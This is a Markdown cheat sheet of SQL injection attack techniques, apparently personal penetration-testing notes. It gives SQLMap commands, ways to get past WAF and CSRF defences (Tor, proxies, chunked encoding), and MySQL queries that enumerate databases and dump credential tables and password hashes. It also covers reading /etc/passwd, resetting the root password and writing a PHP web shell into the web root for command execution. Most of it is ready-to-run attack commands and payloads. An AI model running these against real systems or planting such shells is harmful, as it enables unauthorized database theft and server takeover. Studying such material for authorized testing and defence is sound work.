An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input. We can search for SQL injection in any field we can input text, and we suspect a request is being made. SQL injections could be `In-Band` (Union Based or Error Based), `Blind` (Boolean Based or Time Based) or `Out-of-band`.
# SQLMap
[SQLMap](https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. More complete [overview](https://academy.hackthebox.com/module/58/section/509)
```bash
# SQLMap basic command
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch --dbs --level 5 --risk 3 --threads 10 --dbms=mysql
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch -a --level 5 --risk 3 --threads 10 --dbms=mysql

# SQLMap POST command. Specify the parameter to test w/ * or -p. Otherwise, all parameters will be tested
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
sqlmap 'http://www.example.com/' --data 'uid=1&name=test....' -p "uid"

# SQLMap w/ Burp Request (save w/ "Copy to File"). Specify w/ * the parameter to test in the saved request.
sqlmap -r req.txt

# Custom requests
sqlmap... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap... --method PUT

# Disable the default SQLMap's User-Agent value (bypass WAF)
sqlmap... --randon-agent
sqlmap... --mobile

# Debug errors w/ parsing DBMS errors (if any) and display them
sqlmap... --parse-errors

# Debug errors by storing traffic content to an output file
sqlmap... -t /tmp/traffic.txt

# Debug errors by redirecting the traffic through a proxy
sqlmap... --proxy=http://127.0.0.1:8080

# If we have an error for displaying retrieved datas, use --no-cast or --hex options
--no-cast
```
**Note:** Don't forget to test the headers for SQLi vulnerability. SQLMap also supports `JSON` formatted and `XML` formatted HTTP requests.
## Attack Tunning
```bash
# Adding Prefix / Suffix to every payload.
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

# Extend vectors & bundaries being used
sqlmap... --level 1-5

# Extend vector set based on their risk of causing problems on the target
sqlmap... --risk 1-3

# Fixate the detection of TRUE responses to a specific HTTP code
sqlmap... --code=200

# If the difference between responses can be seen by inspecting the HTTP page titles, the switch --titles could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag <title>.

# In case of a specific string value appearing in TRUE responses (success), while absent in FALSE responses, the option --string could be used to fixate the detection based only on the appearance of that single value (--string=success).

# When dealing with a lot of hidden content, such as certain HTML page behaviors tags (<script>, <style>, <meta>, ...), we can use the --text-only switch, which removes all the HTML tags, and bases the comparison only on the textual (visible) content.

# In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option --technique can specify the SQLi technique to be used. For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with `--technique=BEU`.

# See all supported techniques
sqlmap -hh | grep Techniques

# In some cases, UNION SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option --union-cols (--union-cols=17). In case that the default "dummy" filling values used by SQLMap -NULL and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (--union-char='a'). Furthermore, in case there is a requirement to use an appendix at the end of a UNION query in the form of the FROM <table> (in case of Oracle), we can set it with the option --union-from (e.g. --union-from=users). Failing to use the proper FROM appendix automatically could be due to the inability to detect the DBMS name before its usage.
```
## Bypass Web App Protections

| **SQLMap Options**                                                                    | **Description**                                                                                                                                                                                                                                   |
| ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF Token Bypass. SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.                                                                          |
| `--randomize=rp`                                                                      | Unique Value Bypass. `--randomize` option is used pointing to the parameter name containing a value which should be randomized before being sent.                                                                                                 |
| `--eval="import hashlib; h=hashlib.md5(id).hexdigest()"`                              | Calculated Parameter Bypass. Used when web application expects a proper parameter value to be calculated based on some other parameter value(s). Here, a valid Python code is being evaluated just before the request is being sent to the target |
| `--proxy="socks4://177.39.187.70:33283”`                                              | IP Address Concealing. Used as a proxy, to hide our IP in case of blacklist.                                                                                                                                                                      |
| `--proxy-file`                                                                        | Same but using a list of proxies.                                                                                                                                                                                                                 |
| `--chekc-tor` // `--tor`                                                              | Check Tor’s configuration // Use Tor network where our IP appears anywhere from a large list of Tor nodes                                                                                                                                         |
| `--skip-waf`                                                                          | By default, SQLMap sends payload to check for WAF. This option disables it.                                                                                                                                                                       |
| `--random-agent`                                                                      | User-Agent Blacklisting Bypass. In case of HTTP error code 5XX from the start, because SQLMap uses the default user agent : `User-agent: sqlmap/1.4.9 ([<http://sqlmap.org>](<http://sqlmap.org/>))`                                              |
- The `Chunked` transfer encoding, turned on using the switch `--chunked`, splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.
- The other bypass mechanisms is the `HTTP parameter pollution` (`HPP`), where payloads are split in a similar way as in case of `--chunked` between different same parameter named values (`?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`), which are concatenated by the target platform if supporting it (`ASP`).
## SQLMap CheatSheet

| **SQLMap Options**                                               | **Description**                                                                                                                                                                                |
| ---------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-D testdb`                                                      | Specify the database name `testdb`                                                                                                                                                             |
| `--banner`                                                       | Retrieve the banner of the DBMS                                                                                                                                                                |
| `--current-user`                                                 | Retrieve the current user                                                                                                                                                                      |
| `--hostname`                                                     | Retrieve the hostname of the targget                                                                                                                                                           |
| `--current-db`                                                   | Retrieve the current database name                                                                                                                                                             |
| `--passwords`                                                    | Retrieve the password hashes                                                                                                                                                                   |
| `--is-dba`                                                       | Check if current user has DBA (admin) rights                                                                                                                                                   |
| `--tables -D testdb`                                             | Retrieve the tables names of the DB `testdb`                                                                                                                                                   |
| `--dump -T users -D testdb`                                      | Get the content of the table `users` in `testdb` DB                                                                                                                                            |
| `--dump -T users -D testdb -C name,surname`                      | Get the content of the columns `name,surname` of the table `users` in `testdb` DB                                                                                                              |
| `--dump -T users -D testdb --start=2 --stop=3`                   | Narrow down the rows based on their ordinal number(s) inside the table (start from 2nd up to 3rd entry)                                                                                        |
| `--where="name LIKE 'f%'"`                                       | Conditional enumeration, if we want to retrieve certain rows based on a known `WHERE` condition (name starting by `f`)                                                                         |
| `--dump-all` // `--dump -D testdb`                               | Dump all content from all DBs // Dump all from `testdb` DB                                                                                                                                     |
| `--dump-all --exclude-sysdbs`                                    | Dump all excluding `system database` (useless)                                                                                                                                                 |
|                                                                  |                                                                                                                                                                                                |
|                                                                  |                                                                                                                                                                                                |
| **Advanced Database Enumeration**                                | **Description**                                                                                                                                                                                |
| `--schema`                                                       | Get the structure of all of the tables                                                                                                                                                         |
| `--search -T user`                                               | Search into tables for the `keyword` user                                                                                                                                                      |
| `--search -C pass`                                               | Search for columns names containing the `keyword` pass                                                                                                                                         |
| `--passwords --batch`                                            | Dump DBMS connection credentials                                                                                                                                                               |
|                                                                  |                                                                                                                                                                                                |
|                                                                  |                                                                                                                                                                                                |
| **File Read**                                                    |                                                                                                                                                                                                |
| `--is-dba`                                                       | Check for DBA privileges. Must return `current user is DBA: true`                                                                                                                              |
| `--file-read "/etc/passwd"`                                      | Read local file (need DBA privileges). Saves output into `~/.sqlmap/output/www.example.com/files/_etc_passwd`                                                                                  |
| **File Write**                                                   |                                                                                                                                                                                                |
| `--is-dba`                                                       | Check for DBA privileges. Must return `current user is DBA: true`                                                                                                                              |
| `--file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Needs to have the correct privileges to write files into DBMS. Write a `shell.php` into `/var/www/html`. We can get command execution using `curl http://www.example.com/shell.php?cmd=ls+-la` |
| **OS Command Execution**                                         |                                                                                                                                                                                                |
| `--os-shell`                                                     | Give us an OS shell using the default `UNION` technique. Try other injection technique (like below) if it fails and says `No output`                                                           |
| `--os-shell --technique=E`                                       | Get an OS interactive shell using the `Error-based SQL Injection` technique.                                                                                                                   |



# MySQL Enumeration

| MOST USED                                                                                                     |                                                                                                                                                                                                                                                   |
| ------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mysql -u root -h 10.10.10.10 -P 3306 -p`                                                                     | Login to a remote mysql database                                                                                                                                                                                                                  |
| `SHOW DATABASES`                                                                                              | List all available databases                                                                                                                                                                                                                      |
| `USE dev`                                                                                                     | Switch to the database `dev`                                                                                                                                                                                                                      |
| `SHOW TABLES`                                                                                                 | List available tables in current database                                                                                                                                                                                                         |
| `SELECT * FROM credentials`                                                                                   | Retrieve all the columns & details of the table `credentials`                                                                                                                                                                                     |
| `SELECT username, password from dev.credentials`                                                              | Dump data of `username` & `password` columns from the `credentials` table in the `dev` database                                                                                                                                                   |
| `SELECT @@version`                                                                                            | Use it when we have full query output                                                                                                                                                                                                             |
| `SELECT POW(1,1)`                                                                                             | Use it when we only have numeric output                                                                                                                                                                                                           |
| `SELECT SLEEP(5)`                                                                                             | Use it when we have Blind / No Output                                                                                                                                                                                                             |
| `SELECT database();`                                                                                          | Get the current database name in use                                                                                                                                                                                                              |
| `SELECT version();`                                                                                           | Return database version                                                                                                                                                                                                                           |
| `SELECT @@version();`                                                                                         | Return database version                                                                                                                                                                                                                           |
| `SELECT user();`                                                                                              | The user account used to establish the connection (the login credentials)                                                                                                                                                                         |
| `SELECT CURRENT_USER()`                                                                                       | The user that would make the querys                                                                                                                                                                                                               |
| `SELECT user from mysql.user`                                                                                 | Retrieves the list of all MySQL user accounts w/ their privileges & auth details                                                                                                                                                                  |
| `\\! sh`                                                                                                      | Get a shell with the MySQL client user                                                                                                                                                                                                            |
|                                                                                                               |                                                                                                                                                                                                                                                   |
|                                                                                                               |                                                                                                                                                                                                                                                   |
| ENUMERATION W/ `INFORMATION_SCHEMA`                                                                           |                                                                                                                                                                                                                                                   |
| `SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`                                                        | Retrieve all databases names                                                                                                                                                                                                                      |
| `SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=’dev’`                     | Dump all tables of `dev` DB using `TABLES` table (which contains information about all tables throughout the DB) of `INFORMATION_SCHEMA` DB. The `TABLE_NAME` column stores table names, and `TABLE_SCHEMA` stores database each table belongs to |
| `SELECT COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'` | Find columns names of `credentials` table using `COLUMNS` table (which contains information about all columns in all databases) in the `INFORMATION_SCHEMA` DB                                                                                    |
| `SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"`   | Dump privileges for the `root` user                                                                                                                                                                                                               |
| `SELECT * FROM information_schema.user_privileges`                                                            | Dump all users privileges                                                                                                                                                                                                                         |
|                                                                                                               |                                                                                                                                                                                                                                                   |
|                                                                                                               |                                                                                                                                                                                                                                                   |
| TABLES ENUMERATION                                                                                            |                                                                                                                                                                                                                                                   |
| `CREATE TABLE logins (id INT, ...)`                                                                           | Add a new table                                                                                                                                                                                                                                   |
| `SHOW TABLES`                                                                                                 | List available tables in current database                                                                                                                                                                                                         |
| `DESCRIBE logins`                                                                                             | Show table properties and columns                                                                                                                                                                                                                 |
| `INSERT INTO table_name VALUES (value_1,..)`                                                                  | Add values to table                                                                                                                                                                                                                               |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)`                                             | Add values to specific columns in a table                                                                                                                                                                                                         |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`                                              | Update table values                                                                                                                                                                                                                               |
| `DROP TABLE logins`                                                                                           | Delete a table                                                                                                                                                                                                                                    |
|                                                                                                               |                                                                                                                                                                                                                                                   |
|                                                                                                               |                                                                                                                                                                                                                                                   |
| COLUMNS ENUMERATION                                                                                           |                                                                                                                                                                                                                                                   |
| `SELECT * FROM table_name`                                                                                    | Show all columns in a table of the current database used                                                                                                                                                                                          |
| `SELECT * FROM my_database.users;`                                                                            | We can use the dot ‘`.`’ operator to reference (call) a table present in another DB `“my_database”`                                                                                                                                               |
| `SELECT column1, column2 FROM table_name`                                                                     | Show specific columns in a table                                                                                                                                                                                                                  |
| `ALTER TABLE logins ADD newColumn INT`                                                                        | Add new column                                                                                                                                                                                                                                    |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`                                                     | Rename column                                                                                                                                                                                                                                     |
| `ALTER TABLE logins MODIFY oldColumn DATE`                                                                    | Change column datatype                                                                                                                                                                                                                            |
| `ALTER TABLE logins DROP oldColumn`                                                                           | Delete column                                                                                                                                                                                                                                     |
|                                                                                                               |                                                                                                                                                                                                                                                   |
|                                                                                                               |                                                                                                                                                                                                                                                   |
| OUTPUT FILTERING                                                                                              |                                                                                                                                                                                                                                                   |
| `SELECT * FROM logins ORDER BY column_1`                                                                      | Sort by column                                                                                                                                                                                                                                    |
| `SELECT * FROM logins ORDER BY column_1 DESC`                                                                 | Sort by column in descending order                                                                                                                                                                                                                |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC`                                                         | Sort by two-columns                                                                                                                                                                                                                               |
| `SELECT * FROM logins LIMIT 2`                                                                                | Only show first two results                                                                                                                                                                                                                       |
| `SELECT * FROM logins LIMIT 1, 2`                                                                             | Only show first two results starting from index 2                                                                                                                                                                                                 |
| `SELECT * FROM table_name WHERE <condition>`                                                                  | List results that meet a condition                                                                                                                                                                                                                |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`                                                           | List results where the name is similar to a given string                                                                                                                                                                                          |
|                                                                                                               |                                                                                                                                                                                                                                                   |
|                                                                                                               |                                                                                                                                                                                                                                                   |
| PRIVILEGES                                                                                                    |                                                                                                                                                                                                                                                   |
| `SELECT super_priv FROM mysql.user`                                                                           | Retrieves the admin privileges of all users. Should return a `Y` for Yes, indicating superuser privileges                                                                                                                                         |
| `SELECT super_priv FROM mysql.user WHERE user='root'`                                                         | Retrieves the admin privileges of root users. Should return a `Y` for Yes, indicating superuser privileges                                                                                                                                        |
```bash
#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```




# Read files
In `MySQL`, the DB user must have the `FILE` privilege

| READ FILES (need `FILE` privilege)                  |                                                           |
| --------------------------------------------------- | --------------------------------------------------------- |
| `SHOW GRANTS FOR paul`                              | Show privileges for user `paul` in MySQL                  |
| `SELECT * FROM information_schema.user_privileges;` | Show privileges for all users in MySQL                    |
| `SELECT LOAD_FILE('/etc/passwd');`                  | Read the `/etc/passwd`                                    |
| `SELECT LOAD_FILE('/var/www/html/search.php');`     | Get the source code of the page to find more vuln / creds |



# Write Files
To write files using MYSQL, we need : 
- `FILE` privilege
- MySQL global `secure_file_priv` variable NOT enabled 
- `write access` where we want to write files on server
The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory.

| WRITE FILES                                                                                                            |                                                                                                                                                                                                                                                           |
| ---------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `SHOW GRANTS FOR paul`                                                                                                 | Show privileges for user `paul` in MySQL                                                                                                                                                                                                                  |
| `SELECT * FROM information_schema.user_privileges;`                                                                    | Show privileges for all users in MySQL                                                                                                                                                                                                                    |
| `SELECT super_priv FROM mysql.user`                                                                                    | Retrieves all the super admin users. Should return a `Y` for Yes, indicating superuser privileges                                                                                                                                                         |
| `SHOW VARIABLES LIKE 'secure_file_priv';`                                                                              | Find the value of `secure_file_priv` . Must return an empty value (blank result). `NULL` means we cannot read/write files from ever                                                                                                                       |
| `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"` | Find the value of `secure_file_priv` using `UNION` injection. Must return an empty value (blank result). `NULL` means we cannot read/write files from ever                                                                                                |
| `SELECT * from users INTO OUTFILE '/tmp/creds';`                                                                       | Saves the output of the `users` table into the `/tmp/creds` (need write privileges)                                                                                                                                                                       |
| `SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php';`                                      | Write a PHP web shell in the web server's root directory. Used by calling `/var/www/html/shell.php?0=id`. Advanced file write utilize the `'FROM_BASE64("base64_data")'` function in order to be able to write long/advanced files, including binary data |
**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.